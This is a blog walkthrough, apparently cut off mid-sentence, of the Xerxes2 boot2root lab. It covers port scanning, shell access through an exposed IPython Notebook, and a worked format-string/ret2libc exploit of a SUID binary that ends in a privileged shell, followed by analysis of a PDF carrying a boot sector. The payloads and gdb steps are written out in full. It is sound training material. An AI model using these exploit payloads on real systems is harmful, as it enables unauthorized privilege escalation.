<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Beating Xerxes2 | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="foreword
Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven&rsquo;t done it yet, close this article now and go learn by doing it!
Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="Beating Xerxes2">
<meta property="og:description" content="foreword
Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven&rsquo;t done it yet, close this article now and go learn by doing it!
Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-08-09T16:59:53+00:00">
<meta property="article:modified_time" content="2014-08-09T16:59:53+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Beating Xerxes2">
<meta name=twitter:description content="foreword
Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven&rsquo;t done it yet, close this article now and go learn by doing it!
Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"Beating Xerxes2","item":"https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Beating Xerxes2","name":"Beating Xerxes2","description":"foreword Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven\u0026rsquo;t done it yet, close this article now and go learn by doing it!\nXerxes2, like most other boot2root type CTF\u0026rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!\n","keywords":[],"articleBody":"foreword Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven’t done it yet, close this article now and go learn by doing it!\nXerxes2, like most other boot2root type CTF’s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!\ngetting started The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:\nroot@kali:~# nmap -v --reason -sV 192.168.56.102 -p- Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-09 17:14 SAST [...] PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0) 80/tcp open http syn-ack lighttpd 1.4.31 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) 4444/tcp open krb524? syn-ack 8888/tcp open http syn-ack Tornado httpd 2.3 57504/tcp open status syn-ack 1 (RPC #100024) [...] Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB) Well this gives us a boat load to test out already!\nI quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened nc to the port and redirected the output to a file nc-string. Once the string echoed completely, I quit the nc, and pushed the resultant string through a base64 decode and ran a file against it:\nroot@kali:~# nc 192.168.56.102 4444 | tee nc-string [...] qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo= ^C root@kali:~# cat nc-string | base64 -d  nc-data root@kali:~# file nc-data nc-data: MPEG ADTS, layer III, v2, 64 kbps, 22.05 kHz, Monaural nc-data is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.\n(Electronic Noises \u0026 Robot Voice) This is Xerxes. Why do you persist in your loneliness? (Electronic Noises)\nThe start and end of the voice message had a clear in \u0026 out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.\nThis was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.\nSadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn’t have to.\nfirst shell access Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:\n  However, moving on to tcp/8888, we see it identified as Tornado httpd 2.3. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!\ntcp/8888 hosted a IPython Notebook. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a !. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the delacroix user:\n  And then a easy SSH in:\nroot@kali:~# ssh -i delacroix delacroix@192.168.56.102 The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established. ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts. Welcome to xerxes2. XERXES wishes you a pleasant stay. ____ ___ ____ ___ __ ____ ___ ____ ____ ____ `MM( )P' 6MMMMb `MM 6MM `MM( )P' 6MMMMb 6MMMMb\\ 6MMMMb `MM` ,P 6M' `Mb MM69 \" `MM` ,P 6M' `Mb MM' ` MM' `Mb `MM,P MM MM MM' `MM,P MM MM YM. ,MM `MM. MMMMMMMM MM `MM. MMMMMMMM YMMMMb ,MM' d`MM. MM MM d`MM. MM `Mb ,M' d' `MM. YM d9 MM d' `MM. YM d9 L ,MM ,M' _d_ _)MM_ YMMMM9 _MM_ _d_ _)MM_ YMMMM9 MYMMMM9 MMMMMMMM delacroix@xerxes2:~$becoming polito - the why Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary /opt/bf, owned by polito and had the SUID bit set for him. There was also a folder /opt/backup, with a file korenchkin.tar.enc. There was also mail in /var/mail for the user korenchkin which I am not able to read yet.\nMore interestingly, the .bash_history for the user I am now (delacroix), revealed that the /opt/bf command was recently run, and the sources for this binary was available as bf.c.\ndelacroix@xerxes2:~$ ls -lh total 8.0K -rw-r--r-- 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c -rw-r--r-- 1 delacroix delacroix 100 Aug 9 10:23 Untitled0.ipynb delacroix@xerxes2:~$ history 1 cd 2 ls -alh 3 /opt/bf \"++++[++++++++++++++++++++++++++++++++++++++++++++++++-----------+++++++++++++++++++++#\" 4 cp /media/politousb/bf.c . 5 nano bf.c 6 exit 7 passwd 8 exit delacroix@xerxes2:~$ /opt/bf \"++++[++++++++++++++++++++++++++++++++++++++++++++++++-----------+++++++++++++++++++++#\" LOOK DEEPERdelacroix@xerxes2:~$ As you can see above, running it just prints LOOK DEEPER. I recognized the syntax as brainfk and figured that /opt/bf was simply a brainfk interpreter. But wait, lets inspect bf.c!\ninspecting bf.c A quick read of bf.c confirmed the suspicions that /opt/bf was simply a brainfk interpreter. A buffer was set for the input program, then a function called bf() was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:\ncase '.': printf(\"%c\", buf[datapointer]); break; case ',': buf[datapointer] = getchar(); break; case '': datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer; break; case ': datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer; break; case '+': buf[datapointer]++; break; case '-': buf[datapointer]--; Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as ,., and run it with /opt/bf, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 +, and ran that with a brainfk interpreter like /opt/bf, then you would have the character with ASCII value 62 in memory. You can then print that value with ., or move on the next memory cell with a . The most important thing to learn about brainfk was, there are no high level features. No file IO, no socket IO, nothing.\nThat was our brainfk class for the day.\nfinding the bf vuln With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read bf.c, and realized that one of the case statements was for #, and that when a hash is present it will run:\ncase '#': // new feature  printf(buf); break; Classic format string vulnerability!\nAs exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to somehow exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as polito.\nbecoming polito - the how Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:\n print AAAA%x%x%x%x, adding %s until you see the hex for of A (41), meaning that you are trying to find the position in the stack that printf is placing the arguments. Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of AAAA%16$x. objdump -R /your/bin and find a call in the GOT to override. Place some shellcode as environment variable, ie: EGG, prefixed with say 200 0x90. use gdb, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT. Calculate the required padding of strings to get the correct memory address, and write it using the %n format string. Profit?  While this is all fine and dandy, it was not possible for me to profit with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. /opt/bf was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D\nSo, let me take this step by step on how /opt/bf can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.\n/opt/bf - part1 To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:\n http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html http://codearcana.com/posts/2013/04/28/picoctf-videos.html http://youtu.be/NwzmYSlETI8 http://youtu.be/CHrs30g-3O0  So, lets work with this.\nFirst of all, the program will only printf(buf) the buffer which is brainfk. This is triggered with a #. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to /opt/bf. Remembering the research that was done, I opted to print as many +’s as the ASCII value of the character I wanted, and them simply increment the data cell with , preparing for the next character.\nTo test my theory, I prepared my first payload using python -c:\ndelacroix@xerxes2:~$ echo $(python -c 'print \"+\" * ord(\"a\")') +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ delacroix@xerxes2:~$ /opt/bf \"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\" a That printed the character a as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it printf(buf) that too?\ndelacroix@xerxes2:~$ /opt/bf \"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\" aa 2 a’s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use list comprehension to prepare our payloads for /opt/bf:\nprint \"\".join([\"+\" * ord(x) for x in (\"the quick brown fox\")]) You can copy and paste the above command into a python shell and see the amount of + there are haha.\nAnyways, that settled the brainfk problem.\n/opt/bf - part2 Now that we can easily provide input to /opt/bf to print using the vulnerable printf() function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some AAAA and search for them:\ndelacroix@xerxes2:~$ /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"AAAA\" + \".%x\" * 20 + \"\\n\")])')#\" AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the AAAA input we have given it. Instead of typing like 20 %s, I just use python to do the hard work for me. As you can see, the string 41414141 is present in the output. We can test if we are able to use direct parameter access to access just the string we want:\ndelacroix@xerxes2:~$ /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"AAAA\" + \".%16$x\" \"\\n\")])')#\" AAAA.41414141 Yup! Parameter 16 gives us what we need :)\nGreat. Were making progress… I think.\nFor the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.\n/opt/bf - part3 Now that we know where we can start manipulating pointers, we need to find out what we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.\nFirst of all, /opt/bf was compiled with the NX bit:\ndelacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4 Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:\ndelacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0xb7734000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000) /lib/ld-linux.so.2 (0xb7735000) delacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0xb779b000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000) /lib/ld-linux.so.2 (0xb779c000) delacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0xb77c0000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000) /lib/ld-linux.so.2 (0xb77c1000) delacroix@xerxes2:~$ Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with ulimit -s unlimited\ndelacroix@xerxes2:~$ ulimit -s unlimited delacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0x4001e000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000) /lib/ld-linux.so.2 (0x40000000) delacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0x4001e000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000) /lib/ld-linux.so.2 (0x40000000) delacroix@xerxes2:~$ ldd /opt/bf linux-gate.so.1 = (0x4001e000) libc.so.6 = /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000) /lib/ld-linux.so.2 (0x40000000) delacroix@xerxes2:~$ The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:\ndelacroix@xerxes2:~$ objdump -R /opt/bf /opt/bf: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049a38 R_386_GLOB_DAT __gmon_start__ 08049a48 R_386_JUMP_SLOT printf 08049a4c R_386_JUMP_SLOT getchar 08049a50 R_386_JUMP_SLOT __gmon_start__ 08049a54 R_386_JUMP_SLOT exit 08049a58 R_386_JUMP_SLOT __libc_start_main 08049a5c R_386_JUMP_SLOT memset 08049a60 R_386_JUMP_SLOT putchar delacroix@xerxes2:~$ Here, we will choose to override the printf functions pointer. This is at 0x08049a48. So, this address will have the location of our evil code. But now, how do we know where the evil code is and what is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as ret2libc. The basic idea here is that we override the pointer for printf to system with a argument. I highly recommend you read this pdf for a proper explanation on what exactly this means.\nThe only thing that is left to determine is where system is in memory. Luckily this is also pretty easy to find out. Fire up gdb, run the binary and print system to get the address:\ndelacroix@xerxes2:~$ gdb -q /opt/bf Reading symbols from /opt/bf...(no debugging symbols found)...done. (gdb) run Starting program: /opt/bf usage: /opt/bf [program] [Inferior 1 (process 11342) exited with code 0377] (gdb) print system $1 = {} 0x40062000  (gdb) Soooo, 0x40062000. We have the point in memory where system() lives, and we know where the program is going to go to lookup the printf function. All that is left now is to exploit the format string vulnerability, override the location of printf with system, and provide a new argument for the now fooled printf to run. A new argument can be given by simply providing another # (remember we have the source so that was easy to figure out).\n/opt/bf - part4 We have all the information we need, lets get to work.\nWe fire up gdb, and instead of printing the location of AAAA, we provide a memory address, with a %n format string so that we can write the amount of bites needed to override the pointer location.\nTo aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:\ndelacroix@xerxes2:~$ gdb -q /opt/bf Reading symbols from /opt/bf...(no debugging symbols found)...done. (gdb) disass main Dump of assembler code for function main: 0x08048684 : push %ebp 0x08048685 : mov %esp,%ebp 0x08048687 : and $0xfffffff0,%esp 0x0804868a : sub $0x7540,%esp 0x08048690 : cmpl $0x1,0x8(%ebp) 0x08048694 : jg 0x80486b7  0x08048696 : mov 0xc(%ebp),%eax 0x08048699 : mov (%eax),%eax 0x0804869b : mov %eax,0x4(%esp) 0x0804869f : movl $0x804887c,(%esp) 0x080486a6 : call 0x8048390  0x080486ab : movl $0xffffffff,(%esp) 0x080486b2 : call 0x80483c0  0x080486b7 : movl $0x7530,0x8(%esp) 0x080486bf : movl $0x0,0x4(%esp) 0x080486c7 : lea 0x10(%esp),%eax 0x080486cb : mov %eax,(%esp) 0x080486ce : call 0x80483e0  0x080486d3 : mov 0xc(%ebp),%eax 0x080486d6 : add $0x4,%eax 0x080486d9 : mov (%eax),%eax 0x080486db : lea 0x10(%esp),%edx 0x080486df : mov %edx,0x4(%esp) 0x080486e3 : mov %eax,(%esp) 0x080486e6 : call 0x80484ec  0x080486eb : movl $0x0,(%esp) # 0x080486f2 : call 0x80483c0  End of assembler dump. (gdb) break *0x080486eb Breakpoint 1 at 0x80486eb (gdb) run \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"%16$n\")])')#\" Starting program: /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"%16$n\")])')#\" Breakpoint 1, 0x080486eb in main () (gdb) x/x 0x08049a48 0x8049a48 : 0x00000004 (gdb) Oooooooooooh. So basically 0x8049a48 now says printf lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to system, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.\n(gdb) shell echo $(python -c 'print 0x2000-0x4') 8188 # output is a decimal value We now pad the format string as required, re-run the program in gdb, and inspect 0x08049a48 from the GOT\n(gdb) run \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"%8188u%16$n\")])')#\" The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"%8188u%16$n\")])')#\" H� Breakpoint 1, 0x080486eb in main () (gdb) x/x 0x08049a48 0x8049a48 : 0x00002000 (gdb) You will see some whitespace output as a result of the %8188u, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.\n(gdb) run \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"\\x4a\\x9a\\x04\\x08\" + \"%8188u%16$n\" + \"%17$n\")])')#\" The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"\\x4a\\x9a\\x04\\x08\" + \"%8188u%16$n\" + \"%17$n\")])')#\" H�J� 3 Breakpoint 1, 0x080486eb in main () (gdb) x/x 0x08049a48 0x8049a48 : 0x20042004 (gdb) As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:\n(gdb) shell echo $(python -c 'print 0x4006-0x2000') 8198 # output is a decimal value (gdb) run \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"\\x4a\\x9a\\x04\\x08\" + \"%8184u%16$n\" + \"%8198u%17$n\")])')#\" The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"\\x4a\\x9a\\x04\\x08\" + \"%8184u%16$n\" + \"%8198u%17$n\")])')#\" H�J� Breakpoint 1, 0x080486eb in main () (gdb) x/x 0x08049a48 0x8049a48 : 0x40062000 (gdb) w00t. We have rewritten the GOT for printf to the location of the libc system call using the format string vulnerability. Phew.\n/opt/bf - part5 Now, all that is left is to get the printf to rerun (using the #) with a payload such as /bin/sh. We will append the /bin/sh to the end and just add another # to call printf (which is now overridden):\ndelacroix@xerxes2:~$ /opt/bf \"$(python -c 'print \"\".join([\"+\" * ord(x) for x in (\"\\x48\\x9a\\x04\\x08\" + \"\\x4a\\x9a\\x04\\x08\" + \"%8184u%16$n\" + \"%8198u%17$n\" + \";/bin/sh\")])')##\" H�J� d $ id uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix) $ Oly. Crap. That. Was. Awesome. :D :D\nWe have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.\nbecoming korenchkin We just got a shell with a euid for polito. To make life easier, I copied the public key I generated earlier for the first shell into polito’s home, and SSH’d in as that user.\nAt first glance, it appeared as if we have a gpg encrypted dump and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)\npolito@xerxes2:~$ ls -lh total 43M -rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt -rw-r--r-- 1 polito polito 43M Jul 16 12:17 dump.gpg -rw-r--r-- 1 polito polito 27K Jul 16 12:19 polito.pdf polito@xerxes2:~$ crontab -l [...] @reboot while true ; do nc -l -p 4444 done polito@xerxes2:~$ There was not much I could do with the dump.gpg yet, so I decided to open up the pdf in a pdf viewer:\n  That is all the PDF had. The QR code resolves to “XERXES is watching…”. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the file utility.\npolito@xerxes2:~$ file -k polito.pdf polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records) …x86 boot sector… wait… WHAT?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:\n00000000 83 E0 FF EB 1F 25 50 44 46 2D 31 2E 35 0A 39 39 .....%PDF-1.5.99 00000010 39 20 30 20 6F 62 6A 0A 3C 3C 3E 3E 0A 73 74 72 9 0 obj..str 00000020 65 61 6D 0A 68 E0 08 17 BC 00 10 68 C0 07 1F EB eam.h......h.... 00000030 21 59 81 F9 4D 5A 74 0C B4 0E 86 C1 CD 10 86 C5 !Y..MZt......... 00000040 CD 10 EB ED BE 55 00 AC 75 02 EB FE B4 0E CD 10 .....U..u....... 00000050 EB F5 EB 72 E9 2D 2D 57 41 52 4E 49 4E 47 2D 2D ...r.--WARNING-- 00000060 0A 20 20 20 55 6E 61 75 74 68 6F 72 69 7A 65 64 . Unauthorized 00000070 20 66 69 6C 65 20 61 63 63 65 73 73 20 77 69 6C file access wil 00000080 6C 20 62 65 20 72 65 70 6F 72 74 65 64 2E 0A 20 l be reported.. 00000090 20 20 20 20 58 45 52 58 45 53 20 77 69 73 68 65 XERXES wishe 000000A0 73 20 79 6F 75 0A 20 20 20 20 20 20 20 20 20 20 s you. 000000B0 61 20 6D 6F 73 74 20 70 72 6F 64 75 63 74 69 76 a most productiv 000000C0 65 20 64 61 79 00 68 6F 77 68 59 58 68 0D 0A 68 e day.howhYXh..h 000000D0 37 69 68 68 7A 68 4F 77 68 34 35 68 0A 40 68 67 7ihhzhOwh45h.@hg 000000E0 49 68 20 2C 68 23 6F 68 4D 5A 68 0A 0A 68 4E 6C Ih ,h#ohMZh..hNl 000000F0 68 61 57 68 46 75 68 61 6D 68 0A 20 68 3A 20 68 haWhFuhamh. h: h 00000100 69 73 68 64 20 68 6F 72 68 73 77 68 61 73 68 20 ishd horhswhash 00000110 70 68 68 65 68 0A 54 E9 17 FF 00 00 00 00 00 00 phheh.T......... 00000120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA ..............U. 00000200 25 50 44 46 2D 31 2E 35 0A 25 D0 D4 C5 D8 0A 34 %PDF-1.5.%.....4 Notice the 2 %PDF-1.5. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.\nroot@kali:~# head -c 512 polito.pdf  first root@kali:~# file -k first first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records) root@kali:~# tail -c +512 polito.pdf  second root@kali:~# file second second: Dyalog APL root@kali:~# Opening first in a PDF viewer gave a blank PDF, and second gave the PDF we saw originally with polito.pdf. first was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the structure etc. Eventually it was time to take a break and come back with a fresh look at this.\nI came back with some new ideas. One of them being that I should quickly create a VM, attach first as a disk and try run it and see what the output would be. VirtualBox did not like the 